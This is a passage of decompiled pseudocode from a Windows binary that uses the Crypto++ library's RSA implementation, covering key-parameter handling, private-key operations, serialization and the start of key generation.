__m128i *__fastcall sub_13F1248F0(__int64 a1, __m128i *a2)
{
  sub_13F127B80(a2);
  return a2;
}

//----- (000000013F124910) ----------------------------------------------------
void __fastcall __noreturn sub_13F124910(__int64 a1)
{
  (*(void (__fastcall **)(__int64))(*(_QWORD *)(a1 + 16) + 24i64))(a1 + 16);
  sub_13F124930();
}

//----- (000000013F124930) ----------------------------------------------------
void __noreturn sub_13F124930()
{
  __m128i v0[2]; // [rsp+28h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-58h] BYREF

  sub_13F1053B0(
    v0,
    (const __m128i *)"PK_MessageEncodingMethod: this signature scheme does not support message recovery");
  sub_13F101660((__int64)pExceptionObject, v0);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 13F124930: using guessed type __m128i var_80[2];

//----- (000000013F124990) ----------------------------------------------------
__int64 __fastcall sub_13F124990(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v6; // rbx
  __int64 v7; // rdi
  void ***v8; // rax

  v6 = *(int *)(*(_QWORD *)(a1 + 16) + 4i64);
  v7 = *(_QWORD *)(v6 + a1 + 16);
  v8 = sub_13F110680();
  (*(void (__fastcall **)(__int64, void ***, _QWORD))(v7 + 32))(v6 + a1 + 16, v8, 0i64);
  sub_13F123660(a2, a3, a1 + 72, a1 + 24);
  return a2;
}

//----- (000000013F124A10) ----------------------------------------------------
__int64 __fastcall sub_13F124A10(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  _QWORD v8[2]; // [rsp+20h] [rbp-29h] BYREF
  _QWORD v9[2]; // [rsp+30h] [rbp-19h] BYREF
  _QWORD v10[2]; // [rsp+40h] [rbp-9h] BYREF
  _QWORD v11[2]; // [rsp+50h] [rbp+7h] BYREF
  _QWORD v12[2]; // [rsp+60h] [rbp+17h] BYREF
  _QWORD v13[2]; // [rsp+70h] [rbp+27h] BYREF
  char v14[32]; // [rsp+80h] [rbp+37h] BYREF

  v8[1] = 4294967280i64;
  v9[1] = 4294967280i64;
  v8[0] = sub_13F127AC0;
  v9[0] = sub_13F127AA0;
  v10[0] = sub_13F127A90;
  v11[0] = sub_13F127AF0;
  v12[0] = sub_13F127AE0;
  v13[0] = sub_13F127AD0;
  v10[1] = 4294967280i64;
  v11[1] = 4294967280i64;
  v12[1] = 4294967280i64;
  v13[1] = 4294967280i64;
  sub_13F123BE0((__int64)v14, a1 - 520, a2);
  v2 = sub_13F123940((__int64)v14, (const __m128i *)"Prime1", (__int64)v13);
  v3 = sub_13F123940(v2, (const __m128i *)"Prime2", (__int64)v12);
  v4 = sub_13F123940(v3, (const __m128i *)"PrivateExponent", (__int64)v11);
  v5 = sub_13F123940(v4, (const __m128i *)"ModPrime1PrivateExponent", (__int64)v10);
  v6 = sub_13F123940(v5, (const __m128i *)"ModPrime2PrivateExponent", (__int64)v9);
  return sub_13F123940(v6, (const __m128i *)"MultiplicativeInverseOfPrime2ModPrime1", (__int64)v8);
}

//----- (000000013F124B70) ----------------------------------------------------
__int64 __fastcall sub_13F124B70(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  _QWORD v4[2]; // [rsp+20h] [rbp-48h] BYREF
  _QWORD v5[2]; // [rsp+30h] [rbp-38h] BYREF
  char v6[40]; // [rsp+40h] [rbp-28h] BYREF

  v4[1] = 4294967280i64;
  v5[1] = 4294967280i64;
  v4[0] = sub_13F127B00;
  v5[0] = sub_13F127AB0;
  sub_13F123DB0((__int64)v6, a1 - 120, a2);
  v2 = sub_13F123A90((__int64)v6, (const __m128i *)"Modulus", (__int64)v5);
  return sub_13F123A90(v2, (const __m128i *)"PublicExponent", (__int64)v4);
}

//----- (000000013F124C00) ----------------------------------------------------
char __fastcall sub_13F124C00(__int64 a1, const __m128i *a2, __int64 a3, _QWORD *a4)
{
  __int64 v8; // rax

  if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1BF330, (__int64)&qword_13F1C3E50)
    || (LOBYTE(v8) = sub_13F114C40(a3, (__int64)a4, (int *)(a1 + 32)), !(_BYTE)v8) )
  {
    sub_13F101D10(a2, (__int64)&CryptoPP::PrimeSelector const * `RTTI Type Descriptor', a3);
    v8 = *(_QWORD *)(a1 + 32);
    *a4 = v8;
  }
  return v8;
}
// 13F1BF328: using guessed type const struct CryptoPP::PrimeSelector *CryptoPP::PrimeSelector const * `RTTI Type Descriptor';
// 13F1BF330: using guessed type __int64 qword_13F1BF330;
// 13F1C3E50: using guessed type __int64 qword_13F1C3E50;

//----- (000000013F124C80) ----------------------------------------------------
__int64 *__fastcall sub_13F124C80(__int64 *a1)
{
  signed __int64 v2; // rax
  __m128i *v3; // rdi
  const __m128i *v4; // rbp
  unsigned __int64 v5; // rdx
  __int64 v6; // rax
  __m128i *v7; // rcx
  __int8 *v8; // rbx
  unsigned __int64 v9; // r8
  __m128i *v10; // rax
  unsigned __int64 v11; // rdx
  unsigned __int64 v12; // r8
  signed __int64 v13; // rax
  const __m128i *v14; // rcx
  unsigned __int8 *v15; // rdx
  signed __int64 v16; // rax
  int v17; // er8
  int v18; // er9
  __int64 v19; // rbx
  __int64 v20; // rdi

  if ( *((_BYTE *)a1 + 33) )
  {
    v2 = sub_13F15E554((__int64)&qword_13F1C21A0, (__int64)qword_13F1C5720);
    v3 = (__m128i *)a1[3];
    v4 = (const __m128i *)v2;
    v5 = v3[1].m128i_u64[1];
    v6 = v3[1].m128i_i64[0];
    if ( v5 - v6 < 0xB )
    {
      v3 = sub_13F107AD0(v3, 0xBui64, 0i64, (const __m128i *)"ThisObject:", 0xBui64);
    }
    else
    {
      v3[1].m128i_i64[0] = v6 + 11;
      v7 = v3;
      if ( v5 >= 0x10 )
        v7 = (__m128i *)v3->m128i_i64[0];
      v8 = &v7->m128i_i8[v6];
      sub_13F15EB00((__m128i *)((char *)v7 + v6), (const __m128i *)"ThisObject:", 0xBui64);
      v8[11] = 0;
    }
    v9 = -1i64;
    do
      ++v9;
    while ( v4->m128i_i8[v9] );
    v10 = sub_13F106DB0(v3, v4, v9);
    v11 = v10[1].m128i_u64[0];
    v12 = v10[1].m128i_u64[1];
    if ( v11 >= v12 )
    {
      sub_13F10ECD0(v10, 1ui64, 0i64, 59);
    }
    else
    {
      v10[1].m128i_i64[0] = v11 + 1;
      if ( v12 >= 0x10 )
        v10 = (__m128i *)v10->m128i_i64[0];
      *(__int16 *)((char *)v10->m128i_i16 + v11) = 59;
    }
  }
  if ( !*((_BYTE *)a1 + 32) && !(unsigned int)sub_13F16A1A0((_QWORD *)a1[1], (__int64)"ThisObject:", 0xBui64) )
  {
    v13 = sub_13F15E554((__int64)&qword_13F1C21A0, (__int64)qword_13F1C5720);
    v14 = (const __m128i *)a1[1];
    v15 = &v14->m128i_u8[11];
    v16 = v13 - ((_QWORD)&v14->m128i_i64[1] + 3);
    do
    {
      v17 = v15[v16];
      v18 = *v15 - v17;
      if ( v18 )
        break;
      ++v15;
    }
    while ( v17 );
    if ( !v18 )
    {
      sub_13F101D10(v14, (__int64)&CryptoPP::InvertibleRSAFunction `RTTI Type Descriptor', a1[2]);
      v19 = *a1;
      v20 = a1[3];
      sub_13F113500(v20 + 24, *a1 + 24);
      sub_13F113500(v20 + 72, v19 + 72);
      sub_13F1315D0(v20 + 152, v19 + 152);
      sub_13F113500(v20 + 232, v19 + 232);
      sub_13F113500(v20 + 280, v19 + 280);
      sub_13F113500(v20 + 328, v19 + 328);
      sub_13F113500(v20 + 376, v19 + 376);
      sub_13F113500(v20 + 424, v19 + 424);
      sub_13F113500(v20 + 472, v19 + 472);
      *((_BYTE *)a1 + 32) = 1;
    }
  }
  return a1;
}
// 13F1C21A0: using guessed type __int64 qword_13F1C21A0;
// 13F1C5720: using guessed type __int64 qword_13F1C5720[2];

//----- (000000013F124EC0) ----------------------------------------------------
__int64 *__fastcall sub_13F124EC0(__int64 *a1)
{
  signed __int64 v2; // rax
  __m128i *v3; // rdi
  const __m128i *v4; // rbp
  unsigned __int64 v5; // rdx
  __int64 v6; // rax
  __m128i *v7; // rcx
  __int8 *v8; // rbx
  unsigned __int64 v9; // r8
  __m128i *v10; // rax
  unsigned __int64 v11; // rdx
  unsigned __int64 v12; // r8
  signed __int64 v13; // rax
  const __m128i *v14; // rcx
  unsigned __int8 *v15; // rdx
  signed __int64 v16; // rax
  int v17; // er8
  int v18; // er9
  __int64 v19; // rbx
  __int64 v20; // rdi

  if ( *((_BYTE *)a1 + 33) )
  {
    v2 = sub_13F15E554((__int64)&qword_13F1C3048, (__int64)qword_13F1C5720);
    v3 = (__m128i *)a1[3];
    v4 = (const __m128i *)v2;
    v5 = v3[1].m128i_u64[1];
    v6 = v3[1].m128i_i64[0];
    if ( v5 - v6 < 0xB )
    {
      v3 = sub_13F107AD0(v3, 0xBui64, 0i64, (const __m128i *)"ThisObject:", 0xBui64);
    }
    else
    {
      v3[1].m128i_i64[0] = v6 + 11;
      v7 = v3;
      if ( v5 >= 0x10 )
        v7 = (__m128i *)v3->m128i_i64[0];
      v8 = &v7->m128i_i8[v6];
      sub_13F15EB00((__m128i *)((char *)v7 + v6), (const __m128i *)"ThisObject:", 0xBui64);
      v8[11] = 0;
    }
    v9 = -1i64;
    do
      ++v9;
    while ( v4->m128i_i8[v9] );
    v10 = sub_13F106DB0(v3, v4, v9);
    v11 = v10[1].m128i_u64[0];
    v12 = v10[1].m128i_u64[1];
    if ( v11 >= v12 )
    {
      sub_13F10ECD0(v10, 1ui64, 0i64, 59);
    }
    else
    {
      v10[1].m128i_i64[0] = v11 + 1;
      if ( v12 >= 0x10 )
        v10 = (__m128i *)v10->m128i_i64[0];
      *(__int16 *)((char *)v10->m128i_i16 + v11) = 59;
    }
  }
  if ( !*((_BYTE *)a1 + 32) && !(unsigned int)sub_13F16A1A0((_QWORD *)a1[1], (__int64)"ThisObject:", 0xBui64) )
  {
    v13 = sub_13F15E554((__int64)&qword_13F1C3048, (__int64)qword_13F1C5720);
    v14 = (const __m128i *)a1[1];
    v15 = &v14->m128i_u8[11];
    v16 = v13 - ((_QWORD)&v14->m128i_i64[1] + 3);
    do
    {
      v17 = v15[v16];
      v18 = *v15 - v17;
      if ( v18 )
        break;
      ++v15;
    }
    while ( v17 );
    if ( !v18 )
    {
      sub_13F101D10(v14, (__int64)&off_13F1C3040, a1[2]);
      v19 = *a1;
      v20 = a1[3];
      sub_13F113500(v20 + 24, *a1 + 24);
      sub_13F113500(v20 + 72, v19 + 72);
      *((_BYTE *)a1 + 32) = 1;
    }
  }
  return a1;
}
// 13F1C3040: using guessed type void **off_13F1C3040;
// 13F1C3048: using guessed type __int64 qword_13F1C3048;
// 13F1C5720: using guessed type __int64 qword_13F1C5720[2];

//----- (000000013F125080) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F125080(_QWORD *a1, __int64 a2))()
{
  int v4; // [rsp+30h] [rbp-68h] BYREF
  __int64 v5; // [rsp+38h] [rbp-60h]
  __int64 v6[8]; // [rsp+40h] [rbp-58h] BYREF

  v5 = -2i64;
  sub_13F10B1D0((__int64)v6, a2, 48);
  v6[0] = (__int64)off_13F182200;
  v6[1] = (__int64)off_13F182378;
  sub_13F10ACD0((__int64)v6, &v4, 2, 0, 0);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(*(a1 - 13) + 8i64))(a1 - 13, v6);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(*(a1 - 7) + 8i64))(a1 - 7, v6);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(a1[13] + 8i64))(a1 + 13, v6);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(a1[19] + 8i64))(a1 + 19, v6);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(a1[25] + 8i64))(a1 + 25, v6);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(a1[31] + 8i64))(a1 + 31, v6);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(a1[37] + 8i64))(a1 + 37, v6);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(a1[43] + 8i64))(a1 + 43, v6);
  sub_13F10D020((__int64)v6);
  return sub_13F10B560((__int64)v6);
}
// 13F182200: using guessed type __int64 (__fastcall *off_13F182200[47])();
// 13F182378: using guessed type __int64 (__fastcall *off_13F182378[4])();

//----- (000000013F1251A0) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F1251A0(__int64 a1, __int64 a2))()
{
  __int64 v4[8]; // [rsp+30h] [rbp-58h] BYREF

  sub_13F10B1D0((__int64)v4, a2, 48);
  v4[0] = (__int64)off_13F182200;
  v4[1] = (__int64)off_13F182378;
  (*(void (__fastcall **)(__int64, __int64 *))(*(_QWORD *)(a1 + 16) + 8i64))(a1 + 16, v4);
  (*(void (__fastcall **)(__int64, __int64 *))(*(_QWORD *)(a1 + 64) + 8i64))(a1 + 64, v4);
  sub_13F10D020((__int64)v4);
  return sub_13F10B560((__int64)v4);
}
// 13F182200: using guessed type __int64 (__fastcall *off_13F182200[47])();
// 13F182378: using guessed type __int64 (__fastcall *off_13F182378[4])();

//----- (000000013F125240) ----------------------------------------------------
__int64 __fastcall sub_13F125240(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  int v7; // esi
  __int64 v8; // rdi
  __int64 v9; // rbx
  void ***v10; // rax
  __int64 (__fastcall *(**v11)[4])(); // rax
  __int64 (__fastcall *(**v12)[4])(); // rax
  unsigned __int64 v13; // rcx
  __int64 v14; // rdx
  __int64 v15; // rax
  __int64 v16; // rbx
  unsigned __int64 v17; // rcx
  __int64 v18; // rdx
  __int64 v19; // rsi
  unsigned __int64 v20; // rcx
  __int64 v21; // rdx
  unsigned __int64 v22; // rcx
  __int64 v23; // rdx
  __int64 v24; // rsi
  unsigned __int64 v25; // rcx
  __int64 v26; // rdx
  unsigned __int64 v27; // rcx
  __int64 v28; // rdx
  __int64 v29; // rax
  bool v30; // bl
  unsigned __int64 v31; // rcx
  __int64 v32; // rdx
  unsigned __int64 v33; // rcx
  __int64 v34; // rdx
  unsigned __int64 v35; // rcx
  __int64 v36; // rdx
  unsigned __int64 v37; // rcx
  __int64 v38; // rdx
  char v42[16]; // [rsp+58h] [rbp-A8h] BYREF
  unsigned __int64 v43; // [rsp+68h] [rbp-98h]
  unsigned __int64 v44; // [rsp+70h] [rbp-90h]
  void *v45; // [rsp+78h] [rbp-88h]
  char v46[16]; // [rsp+88h] [rbp-78h] BYREF
  unsigned __int64 v47; // [rsp+98h] [rbp-68h]
  unsigned __int64 v48; // [rsp+A0h] [rbp-60h]
  void *v49; // [rsp+A8h] [rbp-58h]
  char v50[16]; // [rsp+B8h] [rbp-48h] BYREF
  unsigned __int64 v51; // [rsp+C8h] [rbp-38h]
  unsigned __int64 v52; // [rsp+D0h] [rbp-30h]
  void *v53; // [rsp+D8h] [rbp-28h]
  __int64 v54; // [rsp+E8h] [rbp-18h]
  __int64 v55; // [rsp+F0h] [rbp-10h]
  __int64 v56[3]; // [rsp+100h] [rbp+0h] BYREF
  char v57[40]; // [rsp+118h] [rbp+18h] BYREF
  char v58[48]; // [rsp+148h] [rbp+48h] BYREF
  char v59[56]; // [rsp+178h] [rbp+78h] BYREF
  __m128i v60; // [rsp+1B0h] [rbp+B0h] BYREF
  unsigned __int64 v61; // [rsp+1C0h] [rbp+C0h]
  unsigned __int64 v62; // [rsp+1C8h] [rbp+C8h]
  void *v63; // [rsp+1D0h] [rbp+D0h]
  char pExceptionObject[16]; // [rsp+1E0h] [rbp+E0h] BYREF
  unsigned __int64 v65; // [rsp+1F0h] [rbp+F0h]
  unsigned __int64 v66; // [rsp+1F8h] [rbp+F8h]
  void *v67; // [rsp+200h] [rbp+100h]

  v54 = -2i64;
  v55 = a2;
  v7 = 0;
  v8 = *(int *)(*(_QWORD *)(a1 - 104) + 4i64);
  v9 = *(_QWORD *)(v8 + a1 - 104);
  v10 = sub_13F110680();
  (*(void (__fastcall **)(__int64, void ***, _QWORD))(v9 + 32))(v8 + a1 - 104, v10, 0i64);
  v56[1] = (__int64)&CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
  v56[2] = (__int64)v56;
  v56[0] = (__int64)off_13F185368;
  sub_13F112A00((__int64)v57, a1 - 96);
  sub_13F112960((__int64)v58, 0i64, *(_QWORD *)(a1 - 72));
  sub_13F112CF0((__int64)v59);
  sub_13F112CF0((__int64)v50);
  sub_13F112CF0((__int64)v46);
  do
  {
    v11 = sub_13F120160();
    sub_13F11FBB0(a1 - 96, (__int64)&v60, (__int64)v11);
    v7 |= 2u;
    v12 = sub_13F120160();
    sub_13F121660((__int64)v50, a3, (__int64)v12, (__int64)&v60);
    v13 = v62;
    if ( v61 < v62 )
      v13 = v61;
    v14 = (__int64)v63;
    if ( v63 )
    {
      memset(v63, 0, 8 * v13);
      sub_13F12E4D0(v14);
    }
    v15 = sub_13F11EDC0((__int64)v50, (__int64)pExceptionObject, (__int64)v57);
    v16 = sub_13F113500((__int64)v59, v15);
    v17 = v66;
    if ( v65 < v66 )
      v17 = v65;
    v18 = (__int64)v67;
    if ( v67 )
    {
      memset(v67, 0, 8 * v17);
      sub_13F12E4D0(v18);
    }
    sub_13F113500((__int64)v46, v16);
  }
  while ( sub_13F113630((__int64)v46) );
  sub_13F1351A0((__int64)v56, (__int64)v42, (__int64)v50, a1 - 48);
  sub_13F1234E0((__int64)v42, (__int64)pExceptionObject, a4);
  sub_13F11FD00((__int64)pExceptionObject, (__int64)&v60, (__int64)v57);
  v19 = sub_13F113500((__int64)v59, (__int64)&v60);
  v20 = v62;
  if ( v61 < v62 )
    v20 = v61;
  v21 = (__int64)v63;
  if ( v63 )
  {
    memset(v63, 0, 8 * v20);
    sub_13F12E4D0(v21);
  }
  v22 = v66;
  if ( v65 < v66 )
    v22 = v65;
  v23 = (__int64)v67;
  if ( v67 )
  {
    memset(v67, 0, 8 * v22);
    sub_13F12E4D0(v23);
  }
  sub_13F113500((__int64)v42, v19);
  sub_13F138E90(a2, (__int64)v42, a1 + 304, a1 + 256, a1 + 208, a1 + 160, a1 + 352);
  sub_13F1234E0(a2, (__int64)&v60, (__int64)v46);
  sub_13F11FD00((__int64)&v60, (__int64)pExceptionObject, (__int64)v57);
  v24 = sub_13F113500((__int64)v59, (__int64)pExceptionObject);
  v25 = v66;
  if ( v65 < v66 )
    v25 = v65;
  v26 = (__int64)v67;
  if ( v67 )
  {
    memset(v67, 0, 8 * v25);
    sub_13F12E4D0(v26);
  }
  v27 = v62;
  if ( v61 < v62 )
    v27 = v61;
  v28 = (__int64)v63;
  if ( v63 )
  {
    memset(v63, 0, 8 * v27);
    sub_13F12E4D0(v28);
  }
  sub_13F113500(a2, v24);
  v29 = sub_13F1351A0((__int64)v56, (__int64)pExceptionObject, a2, a1 - 48);
  v30 = (unsigned int)sub_13F11C520(v29, a4) != 0;
  v31 = v66;
  if ( v65 < v66 )
    v31 = v65;
  v32 = (__int64)v67;
  if ( v67 )
  {
    memset(v67, 0, 8 * v31);
    sub_13F12E4D0(v32);
  }
  if ( v30 )
  {
    sub_13F1053B0(&v60, (const __m128i *)"InvertibleRSAFunction: computational error during private key operation");
    sub_13F101560((__int64)pExceptionObject, 6, &v60);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVException_CryptoPP__);
  }
  v33 = v44;
  if ( v43 < v44 )
    v33 = v43;
  v34 = (__int64)v45;
  if ( v45 )
  {
    memset(v45, 0, 8 * v33);
    sub_13F12E4D0(v34);
  }
  v35 = v48;
  if ( v47 < v48 )
    v35 = v47;
  v36 = (__int64)v49;
  if ( v49 )
  {
    memset(v49, 0, 8 * v35);
    sub_13F12E4D0(v36);
  }
  v37 = v52;
  if ( v51 < v52 )
    v37 = v51;
  v38 = (__int64)v53;
  if ( v53 )
  {
    memset(v53, 0, 8 * v37);
    sub_13F12E4D0(v38);
  }
  sub_13F113380(v56);
  return a2;
}
// 13F1852F8: using guessed type void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
// 13F185368: using guessed type __int64 (__fastcall *off_13F185368[28])();
// 13F125240: using guessed type char var_128[48];

//----- (000000013F125730) ----------------------------------------------------
__int64 __fastcall sub_13F125730(_QWORD *a1, __int64 a2)
{
  unsigned int v3; // ebx
  _BYTE *v4; // rax
  char v5; // di
  unsigned int v6; // eax
  __int64 v7; // rbx
  char v9; // [rsp+20h] [rbp-49h]
  __m128i v10; // [rsp+30h] [rbp-39h] BYREF
  __int64 v11[12]; // [rsp+40h] [rbp-29h] BYREF
  int v12; // [rsp+A0h] [rbp+37h] BYREF
  char v13; // [rsp+A4h] [rbp+3Bh]
  char v14[3]; // [rsp+A5h] [rbp+3Ch] BYREF

  v10.m128i_i64[1] = -2i64;
  sub_13F10B300((__int64)v11, a2, 48);
  v11[0] = (__int64)off_13F182398;
  v11[1] = (__int64)off_13F182508;
  v12 = 0;
  v13 = 0;
  v3 = 4;
  v4 = (char *)&v12 + 1;
  do
  {
    if ( *v4 )
      break;
    --v3;
    ++v4;
  }
  while ( v3 > 1 );
  v5 = v14[-v3];
  v10.m128i_i8[0] = 2;
  sub_13F1320F0((__int64)v11, &v10, 1ui64);
  v6 = v3 + 1;
  if ( v5 >= 0 )
    v6 = v3;
  v7 = v6;
  sub_13F10CBB0(v11, v6);
  v9 = 1;
  (*(void (__fastcall **)(__int64 *, char *, _QWORD, _QWORD, char))(v11[0] + 48))(
    v11,
    &v14[-v7],
    (unsigned int)v7,
    0i64,
    v9);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(*(a1 - 13) + 16i64))(a1 - 13, v11);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(*(a1 - 7) + 16i64))(a1 - 7, v11);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(a1[13] + 16i64))(a1 + 13, v11);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(a1[19] + 16i64))(a1 + 19, v11);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(a1[25] + 16i64))(a1 + 25, v11);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(a1[31] + 16i64))(a1 + 31, v11);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(a1[37] + 16i64))(a1 + 37, v11);
  (*(void (__fastcall **)(_QWORD *, __int64 *))(a1[43] + 16i64))(a1 + 43, v11);
  sub_13F10D070((__int64)v11);
  return sub_13F10B5E0((__int64)v11);
}
// 13F182398: using guessed type __int64 (__fastcall *off_13F182398[6])();
// 13F182508: using guessed type __int64 (__fastcall *off_13F182508[3])();

//----- (000000013F1258C0) ----------------------------------------------------
__int64 __fastcall sub_13F1258C0(__int64 a1, __int64 a2)
{
  __int64 v4[12]; // [rsp+30h] [rbp-78h] BYREF

  sub_13F10B300((__int64)v4, a2, 48);
  v4[0] = (__int64)off_13F182398;
  v4[1] = (__int64)off_13F182508;
  (*(void (__fastcall **)(__int64, __int64 *))(*(_QWORD *)(a1 + 16) + 16i64))(a1 + 16, v4);
  (*(void (__fastcall **)(__int64, __int64 *))(*(_QWORD *)(a1 + 64) + 16i64))(a1 + 64, v4);
  sub_13F10D070((__int64)v4);
  return sub_13F10B5E0((__int64)v4);
}
// 13F182398: using guessed type __int64 (__fastcall *off_13F182398[6])();
// 13F182508: using guessed type __int64 (__fastcall *off_13F182508[3])();

//----- (000000013F125960) ----------------------------------------------------
void __noreturn sub_13F125960()
{
  __m128i v0[2]; // [rsp+28h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-58h] BYREF

  sub_13F1053B0(v0, (const __m128i *)"PK_MessageAccumulator: DigestSize() should not be called");
  sub_13F101660((__int64)pExceptionObject, v0);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 13F125960: using guessed type __m128i var_80[2];

//----- (000000013F1259C0) ----------------------------------------------------
char __fastcall sub_13F1259C0(__int64 a1, __int64 a2, __int64 a3)
{
  _QWORD *v6; // rax
  __int64 v7; // rax
  unsigned __int64 v8; // rcx
  __int64 v9; // rdx
  bool v10; // bl
  unsigned __int64 v11; // rcx
  __int64 v12; // rdx
  __int64 v13; // rbx
  char v14; // r15
  __int64 v15; // rax
  __int64 v16; // rdi
  __int64 v17; // r13
  void (__fastcall ***v18)(_QWORD, __int64); // rcx
  void (__fastcall ***v19)(_QWORD, __int64); // rcx
  __int64 v20; // rax
  __int64 v21; // rax
  unsigned __int64 v22; // rcx
  __int64 v23; // rdx
  unsigned __int64 v24; // rcx
  __int64 v25; // rdx
  unsigned __int64 v26; // rcx
  __int64 v27; // rdx
  unsigned __int64 v28; // rcx
  __int64 v29; // rdx
  unsigned __int64 v30; // rcx
  __int64 v31; // rdx
  unsigned __int64 v32; // rcx
  __int64 v33; // rdx
  unsigned __int64 v34; // rcx
  __int64 v35; // rdx
  unsigned __int64 v36; // rcx
  __int64 v37; // rdx
  unsigned __int64 v38; // rcx
  __int64 v39; // rdx
  unsigned __int64 v40; // rcx
  __int64 v41; // rdx
  unsigned __int64 v42; // rcx
  __int64 v43; // rdx
  unsigned __int64 v44; // rcx
  __int64 v45; // rdx
  unsigned __int64 v46; // rcx
  __int64 v47; // rdx
  __int64 v48; // rax
  unsigned __int64 v49; // rcx
  __int64 v50; // rdx
  char result; // al
  __int64 v52; // rdi
  __int64 v53; // rdi
  __int64 v54; // rax
  __int64 v55; // rdi
  __int64 v56; // rdi
  __int64 v57; // rax
  unsigned __int64 v58; // rcx
  __int64 v59; // rdx
  signed int v60; // [rsp+20h] [rbp-E0h] BYREF
  __int64 v61; // [rsp+28h] [rbp-D8h]
  char v62[16]; // [rsp+30h] [rbp-D0h] BYREF
  unsigned __int64 v63; // [rsp+40h] [rbp-C0h]
  unsigned __int64 v64; // [rsp+48h] [rbp-B8h]
  void *v65; // [rsp+50h] [rbp-B0h]
  char v66[16]; // [rsp+60h] [rbp-A0h] BYREF
  unsigned __int64 v67; // [rsp+70h] [rbp-90h]
  unsigned __int64 v68; // [rsp+78h] [rbp-88h]
  void *v69; // [rsp+80h] [rbp-80h]
  char v70[16]; // [rsp+90h] [rbp-70h] BYREF
  unsigned __int64 v71; // [rsp+A0h] [rbp-60h]
  unsigned __int64 v72; // [rsp+A8h] [rbp-58h]
  void *v73; // [rsp+B0h] [rbp-50h]
  void **v74; // [rsp+C0h] [rbp-40h] BYREF
  __int64 (__fastcall ***v75)(_QWORD, __int64); // [rsp+C8h] [rbp-38h]
  __int64 v76; // [rsp+D8h] [rbp-28h]
  __int64 (__fastcall **v77)(); // [rsp+E0h] [rbp-20h] BYREF
  char v78[16]; // [rsp+E8h] [rbp-18h] BYREF
  unsigned __int64 v79; // [rsp+F8h] [rbp-8h]
  unsigned __int64 v80; // [rsp+100h] [rbp+0h]
  void *v81; // [rsp+108h] [rbp+8h]
  char v82[16]; // [rsp+118h] [rbp+18h] BYREF
  unsigned __int64 v83; // [rsp+128h] [rbp+28h]
  unsigned __int64 v84; // [rsp+130h] [rbp+30h]
  void *v85; // [rsp+138h] [rbp+38h]
  char v86[16]; // [rsp+148h] [rbp+48h] BYREF
  unsigned __int64 v87; // [rsp+158h] [rbp+58h]
  unsigned __int64 v88; // [rsp+160h] [rbp+60h]
  void *v89; // [rsp+168h] [rbp+68h]
  __int64 (__fastcall **v90)(); // [rsp+180h] [rbp+80h]
  __int64 v91[2]; // [rsp+188h] [rbp+88h] BYREF
  __int64 v92[2]; // [rsp+198h] [rbp+98h] BYREF
  __int64 v93[16]; // [rsp+1A8h] [rbp+A8h] BYREF
  __int64 v94[2]; // [rsp+228h] [rbp+128h] BYREF
  __int64 v95[2]; // [rsp+238h] [rbp+138h] BYREF
  __int64 v96[15]; // [rsp+248h] [rbp+148h] BYREF
  char pExceptionObject[16]; // [rsp+2C0h] [rbp+1C0h] BYREF
  unsigned __int64 v98; // [rsp+2D0h] [rbp+1D0h]
  unsigned __int64 v99; // [rsp+2D8h] [rbp+1D8h]
  void *v100; // [rsp+2E0h] [rbp+1E0h]
  __m128i v101; // [rsp+300h] [rbp+200h] BYREF
  unsigned __int64 v102; // [rsp+310h] [rbp+210h]
  unsigned __int64 v103; // [rsp+318h] [rbp+218h]
  void *v104; // [rsp+320h] [rbp+220h]
  __int64 (__fastcall **v105)(); // [rsp+330h] [rbp+230h]
  __int64 v106[2]; // [rsp+338h] [rbp+238h] BYREF
  __int64 v107[2]; // [rsp+348h] [rbp+248h] BYREF
  __int64 v108[66]; // [rsp+358h] [rbp+258h] BYREF
  __int64 v109[2]; // [rsp+568h] [rbp+468h] BYREF
  __int64 v110[2]; // [rsp+578h] [rbp+478h] BYREF
  __int64 v111[65]; // [rsp+588h] [rbp+488h] BYREF

  v76 = -2i64;
  LODWORD(v61) = 0;
  v60 = 2048;
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, const char *, int *, signed int *))(*(_QWORD *)a3 + 8i64))(
          a3,
          "ModulusSize",
          &int `RTTI Type Descriptor',
          &v60) )
    (*(void (__fastcall **)(__int64, const char *, int *, signed int *))(*(_QWORD *)a3 + 8i64))(
      a3,
      "KeySize",
      &int `RTTI Type Descriptor',
      &v60);
  if ( v60 < 16 )
  {
    sub_13F1053B0(&v101, (const __m128i *)"InvertibleRSAFunction: specified modulus size is too small");
    sub_13F101600((__int64)pExceptionObject, &v101);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v6 = (_QWORD *)sub_13F112AD0((__int64)pExceptionObject, 0x11u);
  v7 = sub_13F1122F0(a3, (__int64)v62, (__int64)"PublicExponent", v6);
  sub_13F113500(a1 - 64, v7);
